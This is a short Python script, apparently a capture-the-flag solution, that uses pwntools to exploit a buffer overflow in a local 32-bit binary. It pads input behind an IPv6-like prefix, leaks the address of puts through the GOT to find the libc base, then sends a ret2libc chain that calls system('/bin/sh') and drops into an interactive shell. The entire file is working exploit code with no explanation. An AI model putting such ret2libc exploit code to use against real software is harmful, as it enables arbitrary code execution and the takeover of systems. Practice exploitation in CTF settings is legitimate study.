import requests
from pwn import *

elf_path = './pwn'
elf = ELF(elf_path)
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
context.binary = elf
context.log_level = 'debug'

p = process(elf_path)

sda = lambda x,y:p.sendlineafter(x,y)
sdl = lambda x:p.sendline(x)
rct = lambda x:p.recvuntil(x)
prt = lambda x:log.info('\x1b[01;38;5;214m' + x + '==>' + hex(eval(x)) + '\x1b[0m')

def valid(payload):
	ipv6 = 'CDCD:910A:2222:5498:8475:1111:3900:2020.'
	ret =  ipv6.ljust(44,'a') + 'a'*8 + payload
	return ret.ljust(0x128,'a')

#gdb.attach(p,'b *0x08048817')
# LEAK 
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x0804889C
payload1 = p32(puts_plt) + p32(main_addr) + p32(puts_got)
payload1 = valid(payload1)
sdl(payload1)
#0xf7d83cb0
rct('// TODO - Finish later...\n')
leak = u32(p.recv(4))
prt('leak')
libcbase = leak - libc.symbols['puts']
prt('libcbase')
# ATTACK
system = libcbase + libc.symbols['system']
binsh = libcbase +libc.search('/bin/sh').next()
payload2 = p32(system) + p32(main_addr) + p32(binsh) 
payload2 = valid(payload2)
sdl(payload2)
#sdl(payload)

p.interactive()